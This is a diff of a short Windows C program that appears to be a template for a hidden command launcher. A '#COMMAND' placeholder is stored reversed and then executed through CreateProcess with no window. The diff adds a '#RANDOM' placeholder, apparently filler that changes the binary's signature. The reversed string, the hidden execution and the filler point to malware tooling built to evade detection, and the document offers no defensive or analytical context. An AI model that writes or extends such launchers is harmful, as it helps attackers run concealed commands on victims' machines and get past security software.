@@ -9,22 +9,23 @@ void inplace_rev( char * s ) {
 
 int main(int argc, char **argv) 
 {
-	  PROCESS_INFORMATION p_info;
-	  STARTUPINFO s_info;
+	PROCESS_INFORMATION p_info;
+	STARTUPINFO s_info;
 
-	  memset(&s_info, 0, sizeof(s_info));
-	  memset(&p_info, 0, sizeof(p_info));
-	  s_info.cb = sizeof(s_info);
+	memset(&s_info, 0, sizeof(s_info));
+	memset(&p_info, 0, sizeof(p_info));
+	s_info.cb = sizeof(s_info);
 	  
-	  char commands[] = "#COMMAND";
-	  
-	  inplace_rev(commands);
+	char random[] = "#RANDOM";
 
-	  if (CreateProcess(NULL, commands, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &s_info, &p_info))
-	  {
-		WaitForSingleObject(p_info.hProcess, INFINITE);
+	char commands[] = "#COMMAND";
+	  
+	inplace_rev(commands);
+
+	if (CreateProcess(NULL, commands, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &s_info, &p_info))
+	{
 		CloseHandle(p_info.hProcess);
 		CloseHandle(p_info.hThread);
-	  }
+	}
 	return 0;
 }
